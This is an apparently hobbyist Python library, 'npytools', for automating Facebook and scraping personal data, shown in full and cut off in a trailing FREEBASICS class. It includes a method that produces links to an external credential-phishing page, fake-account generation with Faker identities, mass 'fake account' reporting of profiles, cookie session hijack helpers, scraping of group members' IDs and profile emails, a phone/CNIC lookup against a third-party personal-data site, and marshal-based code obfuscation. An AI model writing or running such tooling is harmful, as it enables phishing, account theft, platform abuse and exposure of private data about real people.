# -*- coding: UTF-8 -*-
'''
             NPYTOOLS - Library
              BY : Nasir Ali
             Copyright : 2021

   DO NoT ReCode That Woudnt Make You Programmer

#Facebook : fb.com/nasir.xo
#Github : github.com/nasirxo/npytools
#Instagram : instagram.com/nasir.xoz



'''


from faker import *
from requests import *
from bs4 import BeautifulSoup as bs
from random import choice
import urllib
import json
import base64
import marshal 

try:
 from sympy.abc import a,b,c
 from sympy import *
 from sympy.parsing.sympy_parser import parse_expr
except: print('Sympy Not Available !')

import re
import wikipedia
from bing_image_downloader import downloader
import os
#import eliza
import time
from googletrans import Translator
import aiml
import hashlib
from PyDictionary import PyDictionary
dictionary=PyDictionary()
from cricket import *
from pycricbuzz import Cricbuzz

"""
import sys
sys.path.append("/app/.heroku/opencv/lib/python2.7/site-packages")
import cv2
from im import *
"""

nchdir = os.path.join( aiml.__path__[0],'botdata','alice' )
nbot = aiml.Kernel()

'''
if __name__ == '__main__':
  nbot.bootstrap(learnFiles="startup.xml", commands="load alice",chdir=nchdir)
'''



'''
os.system('python -m spacy download en')


from chatterbot.trainers import ChatterBotCorpusTrainer
from chatterbot import ChatBot
from chatterbot.trainers import ListTrainer



nchatbot = ChatBot(
    'Nasir-AI',
    storage_adapter='chatterbot.storage.SQLStorageAdapter',
    logic_adapters=[
        'chatterbot.logic.MathematicalEvaluation',
        'chatterbot.logic.TimeLogicAdapter',
        'chatterbot.logic.BestMatch',
    ],
    database_uri='sqlite:///database.sqlite3'
)


trainer = ChatterBotCorpusTrainer(nchatbot)

# Train the chatbot based on the english corpus
trainer.train("chatterbot.corpus.english")

greet_conversation = [
    "Hello",
    "Hi there!",
    "How are you doing?",
    "I'm doing great.",
    "That is good to hear",
    "Thank you.",
    "You're welcome.",
    "I am Programmed by Nasir Ali"
]

Ltrain =  ListTrainer(nchatbot)

#Training BankBot
Ltrain.train(greet_conversation)
'''

'''
  AlGORITHMATIC FUNCTIONS
  -----------------------

  FUNCTION : they helps in scrapping 
  
'''

#E = eliza.Eliza()

def MSolv(text,ID):
 a = ['÷','×','^','π']
 b = ['/','*','**','pi.n(10)']
 for J in range(len(a)):
    text = text.replace(a[J],b[J])
    
 try:
  if len(re.findall(r'[0-9]',text)) > 1:
    text = text.replace('?','').replace('=','').replace('.','')
    Q = re.subn(r'\S+\s+','',text)[0]
    eq = parse_expr(Q)
    return '{} = {}'.format(Q,eq)
  else:
   if len(re.findall(r'[a-z]',text)) > 1:
     if 'sent a photo.' not in text:
       return nbot.respond(text,ID)
     else:
       return ''  
   else:
     try:
      dt = Translator().translate(text,dest='en')
      rep = nbot.respond(dt.text,ID)
      return Translator().translate(rep,dest=dt.src).text
     except:
      return ''
 except:
   if 'sent a photo.' not in text:
    if len(re.findall(r'[a-z]',text)) > 1:
      return nbot.respond(text,ID)
    else:
     try:
      dt = Translator().translate(text,dest='en')
      rep = nbot.respond(dt.text,ID)
      return Translator().translate(rep,dest=dt.src).text
     except:
      return ''
   else:
    return ''



def get_Quote():
    params = {
        'method':'getQuote',
        'lang':'en',
        'format':'json'
    }
    res = get('http://api.forismatic.com/api/1.0/',params)
    jsonText =json.loads(res.text)
    return jsonText["quoteText"],jsonText["quoteAuthor"]


def phone(n):
      if len(n)==11:
             n = n[1:]
      elif len(n)==13:
        if '+92' in n:
          n = n[3:]
      elif len(n)==12:
        if '92' in n:
          n = n[2:]
      data = {'cnic':'0'+str(n),'submit':'submit'}
      try:
       r = post('https://www.datafinderservice.xyz/datafinder.php',data,timeout=2)
       html = bs(r.content,'html.parser')
       bsH = html.find('table')
       th = bsH.findAll('th')
       td = bsH.findAll('td')
       results = {}
       for i in range(len(th)):
         results[th[i].get_text()] = td[i].get_text()
       PD = ""
       for c in results.keys():
         PD+=c.upper()+' : '+results.get(c).upper()+'\n'
       return PD
      except: return 'Not Available in Database!'




def tsearch(N,T):
  data = []
  for x in N:
   try:
     if T.upper() == x.get_text().upper():
       data.append(x)
   except: pass
  return data

def tnsearch(N,T):
  data=[]
  for x in N:
    try:
      if T.upper() in x.get_text().upper():
         data.append(x)
    except: pass
  return data


def asearch(N,K):
 for i in N:
   try:
     if K in i['href']:
        return i['href']
   except: pass

def alsearch(N,K):
  data=[]
  for i in N:
    try:
      if K in i['href']:
         data.append(i)
    except: pass
  return data


def csearch(n):
  c = []
  for i in n:
    try:
      if i['class']:
        if i['id']:
         if i.h3.a['href']:
           c.append(i['class'])
    except: pass
  return c[-1]


def CFind(n):
   try:
     if n['class']:
       if n.table['class']:
          return n['class']
   except:
     pass


def toid(n):
   if '/profile.php' in n:
     if '&fref' in n:
       return n.split('?id=')[1].split('&fref')[0]
     else:
       return n.split('?id=')[1].split('&refid')[0]
   else:
     if '&fref' in n:
       return n.split('/')[1].split('?fref')[0]
     else:
       return n.split('/')[1].split('?refid')[0]

def toid2(n):
  if '/profile.php' in n:
   return n.split('?id=')[1].split('&refid')[0]




def getform(F):
  data={}
  for x in F.find_all('input',{'type':'hidden'}):
    try: data[x['name']]=x['value']
    except: pass
  try: data['action'] = F['action']
  except: pass
  return data


def e_c(n):
    return ''.join([chr(x) for x in [ord(a) << 2 for a in n]])


def d_c(n):
   return ''.join([chr(x) for x in [ord(a) >> 2 for a in n]])
   

def e_cc(c):
  c_ = compile(c,'<string','exec')
  m = marshal.dumps(c_)
  return e_c(base64.b16encode(m).decode('utf-8'))

def d_cc(c):
  m = d_c(c.replace('\n','')).encode('utf-8')
  c_ = base64.b16decode(m)
  return marshal.loads(c_)
  

''''


'''

def getip(ip):
 r = get("http://api.hostip.info/get_html.php?ip={}&position=true".format(ip))
 print('----'*10+'\n')
 print(r.text)
 print('----'*10)

def encrypt(message):
    S=''
    for Z in message:
      S=S+chr(ord(Z)+2)
    return S


def decrypt(message):
    S=''
    for Z in message:
      S=S+chr(ord(Z)-2)
    return S





'''

   MAIN - CLASS (FB)
   -----------------
   

'''


class FB:
  def __init__(self):
    self.P = Faker().profile()
    self.name = self.P.get('name').split()
    self.email = ''
    self.passwd = Faker().password()
    self.bday = str(choice(range(1,26)))
    self.bmonth = str(choice(range(1,13)))
    self.byear = str(choice(range(1980,2010)))
    self.sex = '2'
    self.s = Session()
    self.url = "https://mbasic.facebook.com{}"
    self.agent = {
      "Accept-Language": "en-US,en;q=0.5",
      #"user-agent":"Mozilla/5.0 (Linux; Android 9; TECNO KC2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36" 
      #Faker().user_agent()
            }
    self.s.headers.update(self.agent)
    self.data = {}
    self.cstatus = ''

  def check(self,test):
    print(self.P.get(test))

  def accountgenerate(self):
    r = self.s.get(self.url.format('/reg'))
    html = bs(r.content,"html.parser")
    form = html.find('form')
    HD = form.find_all('input',{'type':'hidden'})
    for x in HD:
      try: self.data[x['name']]=x['value']
      except: pass
    pname = self.P.get('name').split()
 
    self.data['firstname']=self.name[0]
    self.data['lastname']=self.name[1]
    self.data['reg_email__']=self.email
    self.data['sex']=self.sex
    self.data['custom_gender']=''
    self.data['did_use_age']='false'
    self.data['birthday_day']= self.bday
    self.data['birthday_month']= self.bmonth
    self.data['birthday_year']= self.byear
    self.data['age_step_input']=''
    self.data['reg_passwd__']=self.passwd
    self.data['submit']='Sign Up'
    self.data['i']=''
    self.data['helper']=''
    self.data['zero_header_af_client']=''

    r1 = self.s.post(self.url.format('/reg/submit'),self.data)
    self.cstatus = bs(r1.content,'html.parser').title.get_text()
    return r1

  def verify(self,code):
    data = {}
    r = self.s.get(self.url.format('/recover/code/'))
    html = bs(r.content,'html.parser')
    form = html.findAll('form')
    for x in form:
     try:
       if 'code' in x['action']:
         form = x
     except: pass
     
    for x in form.findAll('input'):
       try: data[x['name']] = x['value']
       except: pass
    data['lsd'] = data['fb_dtsg'].split(':')[0] 
    data['n']=str(code)
    data['reset_action'] = 'Continue'
    r = self.s.post(self.url.format(form['action']),data)   
    return r

  def changepass(self,old,new):
    data = {}
    r = self.s.get(self.url.format('/settings/security/password'))
    html = bs(r.content,'html.parser')
    form = html.findAll('form')
    for x in form:
     try:
      if 'password' in x['action']:
        form = x
     except: pass

    for x in form.findAll('input'):
      try: data[x['name']] = x['value']
      except: pass
    data['password_old'] = old
    data['password_new'] = new
    data['password_confirm'] = new
    data['save'] = 'Save Changes'
    r = self.s.post(self.url.format(form['action']),data)  
    return r   

  def updatebio(self,bio):
    data = {}
    r = self.s.get(self.url.format('/profile/basic/intro/bio/'))
    html = bs(r.content,'html.parser')
    form = html.findAll('form')
    for x in form:
      try:
        if 'bio' in x['action']:
          form = x
      except: pass
      
    for x in form.findAll('input'):
      try: data[x['name']] = x['value']
      except: pass
            
    data['bio'] = bio
    r = self.s.post(self.url.format(form['action']),data)
    return r    

  def report(self,ID):
      data = {}
      r = self.s.get(self.url.format('/mbasic/more/?owner_id='+str(ID)))
      html = bs(r.content,'html.parser')
      link = tnsearch(html.findAll('a'),'report profile')
      try: action = link[0]['href']
      except: pass
      r = self.s.get(self.url.format(action))
      html = bs(r.content,'html.parser')
      form = html.find('form')
      for x in form.findAll('input'):
        try: data[x['name']] = x['value']
        except: pass
      
      data['tag'] = 'profile_fake_account'
      data['action'] = 'Submit'      
      #data['action_key'] = 'FRX_PROFILE_REPORT_CONFIRMATION'
      
      r = self.s.post(self.url.format(form['action']),data)
      html = bs(r.content,'html.parser')
      form = html.find('form')
      data = {}
      for x in form.findAll('input'):
         try: data[x['name']] = x['value']
         except: pass
      data['action'] = 'Submit'
      r = self.s.post(self.url.format(form['action']),data)
      html = bs(r.content,'html.parser')
      form = html.find('form')
      data = {}
      for x in form.findAll('input'):
         try: data[x['name']] = x['value']
         except: pass
      data['action'] = 'Report'
      r = self.s.post(self.url.format(form['action']),data)      
      return r

  def cookieinput(self):
     sco = {}
     parm = ['c_user','datr','fr','sb','xs']
     for x in parm:
         sco[x] = input("{} : ".format(x))
     if len(sco.keys()) == len(parm):
          self.s.cookies.update(sco)
     return sco
     
  def show(self):
   try: 
    return {
    'name': self.P.get('name'),
    'sex': self.sex,
    'email': self.email,
    'password': self.passwd,
    'birthday': self.bday,
    'birthmonth': self.bmonth,
    'birthyear': self.byear,
    'status':self.cstatus
    }
   except: pass  

  def writehtml(self,data,path):
    with open(path,'w') as x:
      print('{} bytes written ..'.format(x.write(data)))

  def getcookie(self):
   try:
    return self.s.cookies.get_dict()
   except: pass

  def getaccountid(self):
   try:
    return self.s.cookies.get_dict()['c_user']
   except: pass
    
  def setcookie(self,cookie):
   with open(cookie,'r') as C:
     try: self.s.cookies.update(json.loads(C.read()))
     except: pass
   
  def getkey(self):
    key = json.dumps(self.s.cookies.get_dict())
    return base64.b16encode(key.encode('utf-8'))

  def setkey(self,key):
    K = json.loads(base64.b16decode(key.encode('utf-8')))
    self.s.cookies.update(K)
    
  def setuseragent(self,agent):
    try: self.s.headers.update(agent)
    except: pass

  def savecookie(self,name):
   try:
    with open(name,'w') as C:
      C.write(json.dumps(self.cookie.get_dict()))
   except: pass
   
  def setproxy(self,proxy):
    try: self.s.proxies=proxy
    except: pass

  def seturl(self,url):
    try: self.url = url
    except: pass
    
  def setemail(self,email):
     try: self.email = email
     except: pass
      
  def setpassword(self,passwd):
     try: self.passwd = passwd
     except: pass

  def setsex(self,sex):
     try: self.sex = sex
     except: pass

  def setname(self,first,last):
     try: 
       self.name[0] = first
       self.name[1] = last
     except: pass

  def setbirthday(self,d,m,y):
     try:
       self.bday=d
       self.bmonth=m
       self.byear=y
     except: pass

  def genlink(self,link):
    B = 'https://l.facebook.com/l.php?u={}'
    data = {
      'u':str(link)
    }
    r = self.s.post('https://www.shorturl.at/shortener.php',data)
    html = bs(r.content,'html.parser')
    SL = 'https://{}'.format(html.find('div',{'id':'formurl'}).input['value'])
    return {
        'fblink':B.format(urllib.parse.quote(SL)),
        'shortenlink':SL
    }

  def genphishinglink(self):
    key = choice(range(1000,9999))
    return {
        'login':'http://fbauth.rf.gd/login.php?q={}'.format(key),
        'data':'http://fbauth.rf.gd/login.php?key={}'.format(key)
    }

  def login(self):
     cred = {'email':str(self.email),'pass':str(self.passwd)}
     r = self.s.post(self.url.format("/login"),data = cred)
     try:
        if "m_ses" in r.url or "home.php" in r.url or "save-device" in r.url:     
            return {
            'login_status':'sucessfull',
            'email':self.email,
            'account_id':self.s.cookies.get_dict()['c_user'],
            'cookie_datr':self.s.cookies.get_dict()['datr'],
            }
        else:
            return {
             'login_status':'failed',
             'account':email,
             'url':r.url
            }
     except:
        return {
         'login_status':'error',
         'error':'No_Internet',
         'type':'404'
        }


  def fbsend(self,message,account_id):
       if not account_id.isdigit():
        try:
         account_id=asearch(bs(self.s.get(self.url.format("/"+str(account_id))).content,'html.parser').findAll('a'),'photo.php').split('&id=')[1].split('&set')[0]
        except: pass
       k = self.url.format('/messages/thread/'+str(account_id))
       data=[]
       urlm=bs(self.s.get(k).content,"html.parser")
       for x in urlm("form"):
          if "/messages/send/" in x["action"]:
             data.append(self.url.format(x["action"]))
             break
      
       for x in urlm("input"):
         try:
           if "fb_dtsg" in x["name"]:
                        data.append(x["value"])
           if "jazoest" in x["name"]:
                        data.append(x["value"])
           if "ids" in x["name"]:
             data.append(x["name"])
             data.append(x["value"])
           if len(data) == 7: break
         except: pass
      
       if len(data) == 7:
        f=self.s.post(data[0],data={
                      "fb_dtsg":data[1],
                      "jazoest":data[2],
                      data[3]:data[4],
                      data[5]:data[6],
                      "body":message,
                      "Send":"Kirim"}).url
        if "send_success" in f:
          return {
                  'status':'message_sent',
                  'account_id':account_id,
                  'message_length':len(message)
          }
        else:
          return {
              'status':'message_failed',
              'account_id':account_id,
              'message_length':len(message)
          }    


  def sendmsg(self,link,text):
   try:
    if len(text) > 2:
     html = bs(self.s.get(link).content,'html.parser')
     data = getform(html.findAll('form')[1])
     data['body']=text
     data['send']='Send'
     return self.s.post(self.url.format(data.pop('action')),data)
   except: pass
    

  def addfriend(self,ID):
   if ID.isdigit():
     r = self.s.get(self.url.format("/profile.php?id="+ID))
   else:
     r = self.s.get(self.url.format("/"+ID))

   html = bs(r.content,"html.parser")
   L = asearch(html.findAll('a'),'profile_add_friend.php')
   return self.s.get(self.url.format(L))   

  def canceladdfriend(self,ID):
     if ID.isdigit():
       r = self.s.get(self.url.format("/profile.php?id="+ID))
     else:
       r = self.s.get(self.url.format("/"+ID))
  
     html = bs(r.content,"html.parser")
     L = asearch(html.findAll('a'),'friendrequest/cancel')
     return self.s.get(self.url.format(L))

  def getmygroups(self):
    r = self.s.get(self.url.format("/groups/?seemore"))
    html = bs(r.content,"html.parser")
    G = html.findAll('li')
    data = {};i=0
    for x in G:
      data[i]={
               'name':x.a.get_text(),
               'id':re.findall(r'\d+',x.a.get('href'))[0]
              };i+=1
    return data

  def getprofile(self,ID):
     #try:
     if ID.isdigit():
       r = self.s.get(self.url.format("/profile.php?id="+ID))
     else:
       r = self.s.get(self.url.format("/"+ID))
  
     html = bs(r.content,"html.parser")
     text = html.find('div',{'id':'basic-info'}).get_text()
     data = {
        'name':html.find('strong',{'class':'cu'}).get_text(),
        'id':asearch(html.findAll('a'),'photo.php').split('&id=')[1].split('&set')[0]
        }
     try: data['birthday']=re.findall('[a-zA-Z]+ \d+, \d+',text)[0].split('Birthday')[1]
     except: pass
     try: data['emails']=re.findall('\S+@\S+',text)
     except: pass
     return data
     #  except: pass 

  def block(self,ID):
    if ID.isdigit():
       r = self.s.get(self.url.format("/profile.php?id="+ID))
    else:
       r = self.s.get(self.url.format("/"+ID))       

    html = bs(r.content,"html.parser")                                   
    L = asearch(html.findAll('a'),'block/confirm')               
    html = bs(self.s.get(self.url.format(L)).content,'html.parser')
    data = getform(html.findAll('form')[1]) 
    data['confirmed']='Block'
    return self.s.post(self.url.format(data.pop('action')),data)

  def unblock(self,ID): 
      L = self.url.format('/privacy/touch/unblock/confirm/?unblock_id='+str(ID))
      html = bs(self.s.get(self.url.format(L)).content,'html.parser')
      data = getform(html.findAll('form')[1])
      data['confirmed']='Unblock'
      return self.s.post(self.url.format(data.pop('action')),data)

  def newmsgs(self):
    msg = {};i=0
    SCAN = lambda u,d:[ d[x].get('ID') for x in d.keys() if d[x].get('ID') == u ]
    r=self.s.get(self.url.format("/messages"))
    html = bs(r.content,"html.parser")
    T = html.findAll('table')
    #print(html)
    old = list(map(lambda x:1 if 'ago' in x.get_text() else 0,T))
    new = list(map(lambda x:1 if 'now' in x.get_text() else 0,T))
    try: oclass = ' '.join(T[old.index(1)].get('class'))
    except: oclass = 0
    
    try: nclass = ' '.join(T[new.index(1)].get('class'))
    except: nclass = 0
    
    print(oclass)
    print(nclass)
    if oclass != 0:
     Z = html.findAll('table',attrs={'class':oclass})
     for M in Z:
      try:
       xid = M.a['href']
       mid = xid.split('c.')[1].split('&')[0].split('%3A')[0]
       m2id = xid.split('c.')[1].split('&')[0].split('%3A')[1]
       ID = [x for x in [mid,m2id] if x != self.s.cookies.get_dict()['c_user']]
       mtext = M.span
       if len(SCAN(ID[0],msg)) == 0:
        msg[i]={
         'name':M.a.get_text(),
         'msg':mtext.get_text(),
         'ID':ID[0],
         'ID2':self.s.cookies.get_dict()['c_user'],
         'link':self.url.format(M.a['href']).split('&refid')[0],
         'type':'old'
        };i+=1
      except: pass
    if nclass != 0:
     Z = html.findAll('table',attrs={'class':nclass})
     for M in Z:
      try:
       xid = M.a['href']
       mid = xid.split('c.')[1].split('&')[0].split('%3A')[0]
       m2id = xid.split('c.')[1].split('&')[0].split('%3A')[1]
       ID = [x for x in [mid,m2id] if x != self.s.cookies.get_dict()['c_user']]
       mtext = M.span
       if len(SCAN(ID[0],msg)) == 0:
        msg[i]={
         'name':M.a.get_text(),
         'msg':mtext.get_text(),
         'ID':ID[0],
         'ID2':self.s.cookies.get_dict()['c_user'],
         'link':self.url.format(M.a['href']).split('&refid')[0],
         'type':'new'
        };i+=1
      except: pass 
    else: 
        n = choice(range(60))
        print(' SLEEPING FOR {} SEC '.format(n))
        time.sleep(n)
    return msg



  def comment(self,message,path):
   mdata = []
   r = self.s.get(path)
   urlm = bs(r.text,"html.parser")
   for x in urlm("form"):
      if "/a/comment.php" in x["action"]:
         mdata.append(self.url.format(x["action"]))
         break
   for x in urlm("input"):
          try:
           if "fb_dtsg" in x["name"]:
              mdata.append(x["value"])
           if "jazoest" in x["name"]:
              mdata.append(x["value"])
           if "ids" in x["name"]:
              mdata.append(x["name"])
              mdata.append(x["value"])
           if len(data) ==7:
                  break
          except:
           pass
   messagedata={
      "fb_dtsg":mdata[1],
      "jazoest":mdata[2],
      mdata[3]:mdata[4],
      "comment_text":str(message),
      "Comment":"comment"}
   status = self.s.post(mdata[0],data = messagedata)
   return status.ok

  def timelinepost(self,text):
   data = {}
   r = self.s.get(self.url.format('/profile.php'))
   html = bs(r.content,'html.parser')
   D = html.find_all('form');a=D[1]
   F = a.find_all('input',{'type':'hidden'})
   for X in F:
     try: data[X['name']] = X['value']
     except: pass
   data["xc_message"] = text
   data["view_post"]='Post'
   data["view_privacy"]="Public"
   Q = self.s.post(self.url.format(a['action']),data)
   return Q.status_code

  def pagepost(self,text,ID):
   data = {}
   r = self.s.get(self.url.format('/'+str(ID)))
   html = bs(r.content,'html.parser')
   D = html.find_all('form');a=D[1]
   F = a.find_all('input',{'type':'hidden'})
   for X in F:
     try: data[X['name']] = X['value']
     except: pass
   data["xc_message"] = text
   data["view_post"]='Post'
   data["view_privacy"]="Public"
   Q = self.s.post(self.url.format(a['action']),data)
   return Q.status_code

  def grouppost(self,text,ID):
   data = {}
   r = self.s.get(self.url.format('/groups/'+str(ID)))
   html = bs(r.content,'html.parser')
   D = html.find_all('form');a=D[1]
   F = a.find_all('input',{'type':'hidden'})
   for X in F:
     try: data[X['name']] = X['value']
     except: pass
   data["xc_message"] = text
   data["view_post"]='Post'
   data["view_privacy"]="Public"
   Q = self.s.post(self.url.format(a['action']),data)
   return Q.status_code
   
  def getonline(self):
    online = []
    html = bs(self.s.get(self.url.format("/buddylist.php")).content,"html.parser")
    for i in html.find_all("a"):
       try:
         if "/messages/read/?fbid" in i['href']:
           online.append(str(i['href']).split("=")[1].split("&")[0])
       except: pass
    return online

  def getcomments(self,link):
    data = {};i=0
    r = self.s.get(link)
    html = bs(r.content,'html.parser')
    Q = html.find_all('div')
    H = html.find_all('div',{'class':csearch(Q)})
    for X in H:
     try:
      c2 = X.div.div['class']
      data[i]={
          'id':X['id'].split("&")[0],
          'name':X.a.get_text(),
          'profile':toid(X.a.get('href')),
          'text':X.find('div',{'class':c2}).get_text(),
          'clink':asearch(X.find_all('a'),'/comment/replies/')
      };i+=1
     except: pass
    return data

  def getcommentsreply(self,link):
    data = {};i=0
    r = self.s.get(link)
    html = bs(r.content,'html.parser')
    Q=html.find_all('div')
    CA = html.find_all('div',{'class':csearch(Q)})
    for X in CA:
      try:
        c2 = X.div.div['class']
        data[i]={
          'id':X['id'].split("&")[0],
          'name':X.a.get_text(),
          'profile':X.a.get('href'),
          'text':X.find('div',{'class':c2}).get_text()
        };i+=1
      except: pass
    return data

  def getfriends(self,ID):
    data = {};i=0
    link = self.url.format('/profile.php?v=friends&id='+str(ID))
    while True:
      try:
        r = self.s.get(link)
        html = bs(r.content,'html.parser')
        for X in html.find_all('table',{'role':'presentation'}):
         if 'profile picture' in X.img['alt']:
          data[i] = {
              'name':X.a.get_text(),
              'id':toid(X.a['href']).split('?fref')[0]
          };i+=1
      except: pass
  
      try:
        J = tsearch(html.find_all('a'),'See more friends')[0]
        link = self.url.format(J['href'])
      except: break
  
    return data

  def getgroupadmins(self,n):
    i=0;data={}
    link = self.url.format("/browse/group/members/?id="+str(n)+"&listType=list_admin_moderator")
    while True:
      con = self.s.get(link)
      html = bs(con.content,"html.parser")
      u = html.find_all('table')
      CZ = [' '.join(u[C]['class']) for C in range(len(u))]
      cls = max(set(CZ),key=CZ.count)
      tb = html.find_all('table',attrs={'class':cls})
  
      for U in tb:
        try:
          data[i]={
             'name':U.a.get_text(),
             'id':U['id'].split('_')[1]
          };i+=1
        except:
          pass
  
      try:
        nlink = html.find("div",attrs={"id":"m_more_item"})
        link = self.url.format(nlink.a['href'])
      except:
        break
    return data

  def getgroup(self,n):
    i=0;data={}
    link = self.url.format("/browse/group/members/?id="+str(n))
    while True:
      con = self.s.get(link)
      html = bs(con.content,"html.parser")
      u = html.find_all('table')
      cls = ' '.join(u[5]['class'])
      tb = html.find_all('table',attrs={'class':cls})
  
      for U in tb:
        try:
          data[i]={
             'name':U.a.get_text(),
             'id':U['id'].split('_')[1]
          };i+=1
        except:
          pass
  
      try:
        nlink = html.find("div",attrs={"id":"m_more_item"})
        link = self.url.format(nlink.a['href'])
      except:
        break
    return data
  

  def getgroupposts(self,n,limit):
    data=[]
    KL = 0
    link = self.url.format("/groups/"+str(n))
    while KL<=limit:
      con = self.s.get(link)
      html = bs(con.content,"html.parser")
      J = html.find_all('a')
      for x in tsearch(J,'Full Story'):
        try:
          data.append(self.url.format(x['href']))
          KL=KL+1
        except: pass
      try:
        K = tsearch(J,'See More Posts')[0]
        link = self.url.format(K['href'])
      except: break
      
    return data


  def gettimelineposts(self,limit):
      data=[]
      KL = 0
      link = self.url.format("/home.php")
      while KL<=limit:
        con = self.s.get(link)
        html = bs(con.content,"html.parser")
        J = html.find_all('a')
        for x in tsearch(J,'Full Story'):
          try:
            data.append(self.url.format(x['href']))
            KL=KL+1
          except: pass
        try:
          K = tsearch(J,'See More Stories')[0]
          link = self.url.format(K['href'])
        except: break
  
      return data

  def getpageposts(self,page,limit):
        data=[]
        KL = 0
        link = self.url.format("/"+page)
        while KL<=limit:
          con = self.s.get(link)
          html = bs(con.content,"html.parser")
          J = html.find_all('a')
          for x in tsearch(J,'Full Story'):
            try:
              data.append(self.url.format(x['href']).split('&refid')[0])
              KL=KL+1
            except: pass
          try:
            K = tsearch(J,'Show mores')[0]
            link = self.url.format(K['href'])
          except: break
    
        return data
  
  


  def getname(self):
   try:
     r = self.s.get(self.url.format('/profile.php'))
     html = bs(r.content,'html.parser')
     return html.title.get_text()
   except: pass

  def notification(self):
    data={};i=0
    r = self.s.get(self.url.format('/notifications.php'))
    html = bs(r.content,'html.parser')
    N = html.find('div',{'id':"notifications_list"})
    T = N.find_all('table',{'class':N.table['class'][0]})
    for X in T:
     try:
      data[i]={
          'name':X.span.span.get_text(),
          'text':X.span.get_text(),
          'link':X.a.get('href')
      };i+=1
     except: pass
    return data

  def postdata(self,link):
   try:
     Z = self.s.get(link)
     html = bs(Z.content,'html.parser')
     ht = html.find('div',{'id':'m_story_permalink_view'})
     data = {}
          
     try: data['name']=ht.find('a').get_text()
     except: pass
     try: data['id']=ht.find('a')['href'].split('?id=')[1].split('&')[0]
     except: pass
     try: data['id']=toid(ht.find('a')['href'])
     except: pass
     try: data['image']=ht.find('img')['src']
     except: pass
     try: data['like']=self.url.format(asearch(html.findAll('a'),'like.php?'))
     except: pass
     try: data['text']=ht.find('p').get_text()
     except: pass
     try: data['story_text']=ht.find('div',{'class':'ci'}).get_text()
     except: pass  
     return data
   except: return {}

  def follow(self,n):
     try:
      try:
       html = bs(self.s.get(self.url.format("/profile.php?id="+str(n))).text,"html.parser")
      except:
        pass
  
      for i in html.find_all("a"):
        try:
          if "profile_add_friend.php" in i['href']:
            s.get(url.format(i['href']))
  
          elif "subscribe.php" in i['href']:
            self.s.get(self.url.format(i['href']))
        except: pass
     except: pass
  
  def pagelike(self,n):
      r = self.s.get(self.url.format('/'+n))
      html = bs(r.content,'html.parser')
      LA = html.find_all('a')
      T = self.s.get(self.url.format(asearch(LA,'/a/profile.php?fan')))
      return T


  def share(self,link,text):
     r = self.s.get(link)
     html = bs(r.content,'html.parser')
     L = [x for x in html.findAll('a') if x.get_text()=='Share'][0]['href']
     html = bs(self.s.get(self.url.format(L)).content,'html.parser')
     data = getform(html.find('form'))
     link = self.url.format(data.pop('action'))
     data['xc_message']=text
     data['view_privacy']='Public'
     data["view_post"] = 'Share'
     return self.s.post(link,data)
     
  def getfriendlist(self,n):
      data={};i=0
      link = self.url.format("/friends")
      while i<=n:
        con = self.s.get(link)
        html = bs(con.content,"html.parser")
        J = html.find_all('a')
        for x in tsearch(J,'Add Friend'):
          try:
            data[i]={
            'name':x['aria-label'].split('Add ')[1].split(' as a friend')[0],
            'id':x['href'].split('add_friend.php?id=')[1].split('&hf=')[0],
            'link':x['href']
            };i+=1
          except: pass
        try:
          K = tsearch(J,'See More')[0]
          link = self.url.format(K['href'])
        except: break
  
      return data
  
  def timelineupload(self,text,file):
      r = self.s.get(self.url.format('/profile.php'))
      html = bs(r.content,'html.parser')
      pform = getform(html.find_all('form')[1])
      pform["view_photo"]='Photo'
      act = self.url.format(pform.pop('action'))
      upz = bs(self.s.post(act,pform).content,'html.parser')
      xdat = getform(upz.find('form'))
      xdat["add_photo_done"] = "Preview"
      act2 = self.url.format(xdat.pop('action'))
      file = {
        'file1':(file,open(file,'rb'),'multipart/form-data',
        {'Expires': '0'})
        }
      htm = bs(self.s.post(act2,data=xdat,files=file).content,'html.parser')
      dq = getform(htm.find('form'))
      dq["view_privacy"] = 'Public'
      dq["xc_message"]=str(text)
      dq["view_post"] = 'Post'
      return self.s.post(self.url.format(dq.pop('action')),dq)

  def groupupload(self,ID,text,file):
      r = self.s.get(self.url.format('/groups/'+str(ID)))
      html = bs(r.content,'html.parser')
      pform = getform(html.find_all('form')[1])
      pform["view_photo"]='Photo'
      act = self.url.format(pform.pop('action'))
      upz = bs(self.s.post(act,pform).content,'html.parser')
      xdat = getform(upz.find('form'))
      xdat["add_photo_done"] = "Preview"
      act2 = self.url.format(xdat.pop('action'))
      file = {
        'file1':(file,open(file,'rb'),'multipart/form-data',
        {'Expires': '0'})
        }
      htm = bs(self.s.post(act2,data=xdat,files=file).content,'html.parser')
      dq = getform(htm.find('form'))
      dq["view_privacy"] = 'Public'
      dq["xc_message"]=str(text)
      dq["view_post"] = 'Post'
      return self.s.post(self.url.format(dq.pop('action')),dq)
  
  def pageupload(self,ID,text,file):
       r = self.s.get(self.url.format('/'+str(ID)))
       html = bs(r.content,'html.parser')
       pform = getform(html.find_all('form')[1])
       pform["view_photo"]='Photo'
       act = self.url.format(pform.pop('action'))
       upz = bs(self.s.post(act,pform).content,'html.parser')
       xdat = getform(upz.find('form'))
       xdat["add_photo_done"] = "Preview"
       act2 = self.url.format(xdat.pop('action'))
       file = {
         'file1':(file,open(file,'rb'),'multipart/form-data',
         {'Expires': '0'})
         }
       htm = bs(self.s.post(act2,data=xdat,files=file).content,'html.parser')
       dq = getform(htm.find('form'))
       dq["view_privacy"] = 'Public'
       dq["xc_message"]=str(text)
       dq["view_post"] = 'Post'
       return self.s.post(self.url.format(dq.pop('action')),dq)

  def imagesend(self,link,file):
    html = bs(self.s.get(link).content,'html.parser')
    data = getform(html.findAll('form')[1])
    data['send_photo'] = 'Add Photos'
    act = self.url.format(data.pop('action'))
    html = bs(self.s.post(act,data).content,'html.parser')
    data = getform(html.find('form'))
    #data['body']=text
    file = {
        'file1':('pic.jpg',open(file,'rb'),'multipart/form-data',
        {'Expires': '0'})
    }
    return self.s.post(data.pop('action'),data,files=file)

class FREEBASICS:
    def __init__(self):
        self.agent = {"Accept-Language": "en-US,en;q=0.5",'user-agent':"Mozilla/5.0 (Linux; Android 5.0; ASUS_T00G Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36"}
        self.oid = ''
        self.html =''
        self.s=Session()
        self.s.headers.update(self.agent)
        r = self.s.get('https://https-en-m-wikipedia-org.0.freebasics.com')
        html = bs(r.content,'html.parser')
        try:
          x = html.find('form')
          E = x.find_all('input',{'type':'hidden'})
          data = {}
          for X in E:
              try: data[X['name']]=X['value']
              except: pass
